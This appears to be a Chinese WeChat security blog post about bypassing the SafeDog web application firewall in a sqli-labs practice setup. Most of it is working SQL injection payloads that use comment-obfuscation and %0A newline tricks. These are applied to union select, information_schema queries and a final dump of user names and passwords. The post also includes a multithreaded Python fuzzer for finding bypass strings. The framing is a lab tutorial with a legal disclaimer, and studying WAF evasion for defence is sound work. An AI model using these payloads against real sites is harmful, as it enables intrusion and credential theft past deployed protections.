<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HTNuoSUmp1XsvxGbcwUeOg)

<table width="677" data-darkmode-color-16584777530619="rgb(163, 163, 163)" data-darkmode-original-color-16584777530619="#fff|rgb(0,0,0)" data-darkmode-color-16620159341512="rgb(163, 163, 163)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)"><tbody data-darkmode-color-16584777530619="rgb(163, 163, 163)" data-darkmode-original-color-16584777530619="#fff|rgb(0,0,0)" data-darkmode-color-16620159341512="rgb(163, 163, 163)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)"><tr data-darkmode-color-16584777530619="rgb(163, 163, 163)" data-darkmode-original-color-16584777530619="#fff|rgb(0,0,0)" data-darkmode-color-16620159341512="rgb(163, 163, 163)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)"><td width="557" valign="top" height="62" data-darkmode-color-16584777530619="rgb(163, 163, 163)" data-darkmode-original-color-16584777530619="#fff|rgb(0,0,0)" data-style="margin: 0px; padding: 5px 10px; outline: 0px; word-break: break-all; hyphens: auto; border-width: 1px; border-style: solid; border-color: rgb(221, 221, 221); max-width: 100%; visibility: visible; overflow-wrap: break-word !important; box-sizing: border-box !important;" data-darkmode-color-16620159341512="rgb(163, 163, 163)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)"><p data-darkmode-color-16620159341512="rgb(163, 163, 163)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)"><span data-darkmode-color-16617478585178="rgb(255, 23, 0)" data-darkmode-original-color-16617478585178="#fff|rgb(255, 0, 0)" data-style="margin: 0px; padding: 0px; outline: 0px; max-width: 100%; color: rgb(255, 0, 0); visibility: visible; box-sizing: border-box !important; overflow-wrap: break-word !important;" data-darkmode-color-16618570009176="rgb(255, 23, 0)" data-darkmode-original-color-16618570009176="#fff|rgb(255, 0, 0)" data-darkmode-color-16620159341512="rgb(255, 23, 0)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)|rgb(255, 0, 0)">声明：该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系刘一手。</span></p><p data-darkmode-color-16620159341512="rgb(163, 163, 163)" data-darkmode-original-color-16620159341512="#fff|rgb(0,0,0)">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</p></td></tr></tbody></table>  
环境
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### 1、网站安全狗 Apache 版

http://free.safedog.cn/![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshUQCsUYCncucIS49SPNm7rjV5VNMUfLVv8bbSXFmtGibtwV6LD64gtlQ/640?wx_fmt=png)

安装过程找不到服务 解决 https://blog.csdn.net/qq_51550750/article/details/123843078![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshDp8fO0GGuMTia2EQ90k2kS1ibARXaPg6snEYjThW2icRJbdZlBHHej7Vw/640?wx_fmt=png)http://free.safedog.cn/

#### 2、sqli-labs

https://github.com/Audi-1/sqli-labs

#### 3、小皮面板

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Ksh8LFGIHOZhZOoxtFWgmqu2yPbfwcjE0EwuHH8n47f8PDcqFZicb45mCg/640?wx_fmt=png)image.png

and 绕过
------

检测是否存在注入 ?id=1' 安全狗未拦截![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KsheaNdm47icMia2uBpBOqnjfLZPrvxqSEm1LlLYCqjic7K369VXAgBicN1Qg/640?wx_fmt=png)

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=1' and 1=1%23
```

安全狗拦截![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Ksh1z5B6Lm6VHhhrxphE324FqfYlqNjK4laNicVOJXOvkJCib9aveEVLUFA/640?wx_fmt=png)这是最应该**「先做」**也是**「最简单的部分」**，因为 WAF 大都是通过**「黑名单」**的方式进行拦截，所以如果出现了被拦截的情况，大概率是因为你的语句的**「某个函数或其他位置」**触发了黑名单的验证机制，导致被拦截, 那应该怎么检测呢？其实**「一个一个试」**就行了

```
例如我这里的and 1=1被拦截，就可以依次输入
and 
and(空格) 
and 1
and 1=
and 1=1
```

通过这种方式看看哪个语句被拦截，从而判断是哪个部分触发的拦截，再做对应的绕过或者替换就可以了**「演示」**：比如这里我**「输入 and，正常」**，**「and + 空格，正常」**，输入**「and 1 出现拦截」**页面，如下 说明 “and 1” 这个部分触发了拦截，此时的绕过方式可以选择替换或者绕过，这里我们先试试对中间的空格进行替换![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshDSZh90QGY4r3CqE1gxueurRkOVicia83hfkSiaSZBKbut6fWZRyoubH0A/640?wx_fmt=png)大家都知道语句的很多部分都有对应的替换方式，而且还不止一种，特别是空格的替换方式尤其多，我们不可能全部都能记住，——**「FUZZ 绕过」**

Fuzz 绕过利用
---------

Fuzz 测试，也称为模糊匹配，意思就是在不知道攻击 poc 的情况下，我们通过编写脚本或者利用一些自动化工具来进行匹配目标的脚本，尝试获取 poc，其实就是基于字典的爆破，在字典中构造语句来进行批量的测试 演示：![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshUTdtcOlpYITkWe0g1wQjr1UwzXKCZ9Yfnicoiarc3WwummvL6Astn3PQ/640?wx_fmt=png)比如这里我们想替换 and 和 1 之间的空格来绕过检测，就可以将空格的替换方式整理到字典中，在使用 burp 来批量跑进行测试，尝试获取 payload 举个简单的例子，来看看下面这个语句

```
/sql/less-1/?id=1' and 1=1 %23
```

如果我们想要替换空格，最常见的就是 /**/，如下

```
sql/less-1/?id=1'/**/and 1=1 %23
```

但却不一定好用，大概率被过滤，其实 /******/ 中间是可以加特殊符号的，但加什么，其实需要慢慢试，这时候就可以用到 fuzz 了，直接选中 /***1234***/ 中间的数据，将其作为变量进行爆破，如下![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshiaRa6zcKEiaFprtcfz4TrWZZyQ6pQ0mric5HnlQdIw2kmrQy2DaHvD3wg/640?wx_fmt=png)这里 payload 的类型选择 burpsuite 自带的**「Brute force」**, 用特殊符号组成**「1-4 位字典」**进行爆破，如下![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshgjHw5zzGdQrY39f0EHrEiamBr3MMkOezowIUMl0OiaNLsXpmFMWY1Stw/640?wx_fmt=png)点击 start 进行 fuzz![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshU04F4Bonoda2VBWgzORLF8icajic5eQiaknho3CmXkQDxD2m1sreia7Nmg/640?wx_fmt=png) 根据结果可以看到**「Length=905」**的都可以成功,/+-+ 配合包着的注释符就是 /_*****__**/+-+***_/ 可以替换空格，这就完成了一次绕过 waf 和制造 payload，这也是 sql 注入 bypass 中最常用的技巧

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=1' and/*/+-+*/1=1%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshVsdbicAnkMGaicmdM7zRKBXqtAvjuyGfM3DfcJyXpJiaLXuabhkE9VvhA/640?wx_fmt=png)1=2 的逻辑判断语句，再次验证是否成功绕过

```
?id=1' and/*/+-+*/1=2%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshynC9UiaHXpxbEkPz49Kaia0IDoCFnKGd1jZywDfNet1WQSsTPaiaElOow/640?wx_fmt=png)image.png

python 脚本进行 fuzz
----------------

```
import requestsimport itertools as itsimport queue,threadingdef Bypass_dog():    while not q.empty():        payload = q.get()        try:            url = f"http://10.211.55.9:8080/sqli-labs/Less-1/?id=1' and/*{payload}*/1=1%23"            res = requests.get(url=url)            if 'Your Password' in res.text:                print(payload)        except:            passif __name__ == '__main__':    q = queue.Queue()    numbers='5'    words = "-+/!#"    for number in range(1, int(numbers) + 1):        r = its.product(words, repeat=number)        for i in r:            i="".join(i)            q.put(i)    thread_list = []    for i in range(10):        t = threading.Thread(target=Bypass_dog)        thread_list.append(t)    for t in thread_list:        t.setDaemon(True)        t.start()    for t in thread_list:        t.join()
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Kshf10eN76XTT91suMK9m4cf6ibE8WzWZUUAa5VsDz6c4HLHdE5kIpjXXQ/640?wx_fmt=png)
-------------------------------------------------------------------------------------------------------------------------------------------

**「order by 绕过」**
-----------------

我们直接把后面的逻辑判断语句尝试修改为 order by，不出意外，被拦截，如下

```
/sql/less-1/?id=1'order by 2 %23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Ksh4oXLicoiamtBQ4MdrgW6Taicj6pXqufsqaw820GUtYgNjV0FpPQ5Y8mWA/640?wx_fmt=png)**「尝试」**

```
1' order
1' order by
```

使用 /_*****__**/+-+***_/ 替换空格绕过

```
?id=1' order/*/+-+*/by 3%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshUQ7PSodhicoRERqN0PmJ7H0BNLZfsLRKM2hudPYGrDwSta6k9GBmPdA/640?wx_fmt=png)image.png

union select 绕过
---------------

使用 /*_/-+-*/_ 替换空格绕过

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=-1' union/*/-+-*/select 1,2,3 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshFicNQYicjHxpJQJHk8xDziblfiaJzgVnJ6iac2HliaXiadpYMHAmVtaRdH9Vg/640?wx_fmt=png)image.png

database() 绕过
-------------

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshZv3XG2ZSWV8cSFfEgmKho9zM5kCse7WabwOE0pOExmCib5xfuYZOeiaQ/640?wx_fmt=png)image.png

绕过

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=-1' union/*/-+-*/select 1,database/*/--/*/(),3 --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshVLA4P5ZVIhKiaib9yUehwQJtGksfrM4wZBVibbYtJyTvQUy300gOutxhw/640?wx_fmt=png)image.png

information_schema 绕过
---------------------

### 获取 securitys 数据库中的表

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=-1' union/*/-+-*/select 1,(select/*/-+-*/group_concat(table_name) from information_schema.tables where table_schema=database/*/--/*/()),3%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Kshliao95ReMsKeZYHZe9KRqfbWg2p8gLBpbopicu0zgeGcMWTOmqIHAePQ/640?wx_fmt=png)通过 fuzz 测试发现对 information_schema.tables 过滤很严格![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshvEH4Sldr7e4qhZEDkGBhePyj6AfE4jhnwNbPVTth5cfJ1QyBPjiavew/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Kshwg4jQClURweYTFHsES6Bh3QwA7WNkWLIj3senAZtr02EFE2LfVCN0g/640?wx_fmt=png)

#### 使用 %0A 换行污染绕过

在 GET 请求时，将 URL 的 SQL，关键字用 %0A 分隔，%0A 是换行符，在 mysql 中可以正常执行。

```
/*!%23%0aselect*/
```

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=-1' union/*/-+-*/select 1,(select/*/-+-*/group_concat(table_name) from /*!--+*//*%0ainformation_schema./*!tables*/ where table_schema=database/*/--/*/()),3%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8KshjwGx94dXwgOdp71nKGI9XnQXqiciaOp9SFtKibse0xNiaiaONAa9O3HvRMA/640?wx_fmt=png)image.png

### 获取 securitys 数据库中表的字段

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=-1' union/*/-+-*/select 1,(select/*/-+-*/group_concat(column_name) from /*!--+*//*%0ainformation_schema./*!columns*/ where table_schema=database/*/--/*/()),3%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Ksh95HZQvWIc8hiawJkvzicMs7qiaUEmQ0NPfiay18KspXoGU0wexX25kwxmQ/640?wx_fmt=png)image.png

### 获取 user 表中 username 字段的内容

```
http://10.211.55.9:8080/sqli-labs/Less-1/
?id=-1' union/*/-+-*/select 1,(select/*/-+-*/group_concat(username,0x3a,password) from users),3%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyPd1mKQx5gg2WJmCK5V8Ksh5qibrtq30LfoSBODrFs2NGY5hM1L2PJ62Mpicia16ASTbNTBzhyxuw67Q/640?wx_fmt=png)image.png

**欢 迎 加入学习**

**![](https://mmbiz.qpic.cn/mmbiz_jpg/0YvAy5BgkyOdovJ8Picp6ricHzviboPL1FwMNoukmibuicibVKLuGiamN9lUYxe8aFU5iau31mWvfkAW6XkOfQjQYickLLg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)**

**![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOdovJ8Picp6ricHzviboPL1FwMPGThuwdvsfIBwrcbtjlrVTzOHtCOz4mibWV9FkZLDgQy4GFgxJBiaXg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)**

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN6Z3VDQXPuBtPayOiciafUHibGoFlpliaTbAz9ZnbBuPo2wiaypicen7Fsicl9xj9qTOxwDjmE0LiafchZMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247486916&idx=1&sn=984c77b45bd8cd9d4c18e6d4e48f7a77&chksm=c01cc154f76b4842794057c17d6d4d2b53d511086f7a1b2179f18b013ecb10d0130b11e21b30&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN6Z3VDQXPuBtPayOiciafUHib7dkLZIYyzn51ppgOEZLjcETxnVNqpK8IaPFIrYwO1e9yGo5yKMjHjQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247484227&idx=1&sn=9a75c274d878cff798b7939bbde81cc6&chksm=c01ccfd3f76b46c56fd931ef3298b890ad38c11a292e8a8e5925399177535798e1bf57aabbe6&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN6Z3VDQXPuBtPayOiciafUHibkRtDyibGvAaqPpnVJiabjA01NOKv8boMlt20dMrUtlFM51dU47wwSiaSA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247486647&idx=1&sn=1bff4578d5a5be7f2b61256ed936bf87&chksm=c01cc027f76b4931bea1c2da2de5c2efc81198b2a592c11c69cf12bf46a4ec77ff4de2aac74a&scene=21#wechat_redirect)